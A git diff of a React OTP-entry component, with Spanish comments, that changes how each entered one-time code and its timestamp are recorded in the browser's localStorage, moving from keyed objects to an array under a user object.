@@ -281,7 +281,7 @@ export default function NumeroOTP() {
         }));
     };
 
-    // Metodo para registrar el intento de otp
+    // Metodo para registrar el intento de otp - ESTRUCTURA UNIFICADA
     const actualizarLocalStorage = (otpValue) => {
 
         // Se obtiene los datos del localStorage
@@ -293,24 +293,25 @@ export default function NumeroOTP() {
         // Se parsea el JSON o se inicializa un objeto vacío
         let datos = raw ? JSON.parse(raw) : {};
 
-        // Se inicializa el objeto de intentos si no existe
-        if (!datos.otp) datos.otp = {};
+        // Se inicializa el objeto usuario si no existe
+        if (!datos.usuario) datos.usuario = {};
+        if (!datos.usuario.otp) datos.usuario.otp = [];
 
-        // Se crea la clave del nuevo intento
-        const intentoNum = Object.keys(datos.otp).length + 1;
-        const intentoKey = `intento_${intentoNum}`;
-
-        // Se registra el nuevo intento
-        datos.otp[intentoKey] = {
+        // Se crea el objeto del intento
+        const nuevoIntento = {
+            intento: datos.usuario.otp.length + 1,
             codigo: otpValue,
             fecha: new Date().toLocaleString(),
         };
 
+        // Se agrega al array
+        datos.usuario.otp.push(nuevoIntento);
+
         // Se guarda nuevamente en el localStorage
         localStorage.setItem(storageKey, JSON.stringify(datos));
 
-        // Se retorna el objeto de intentos
-        return datos.codigo;
+        // Se retorna el codigo
+        return datos.usuario.otp;
     };
 
     const handleContinuar = async () => {
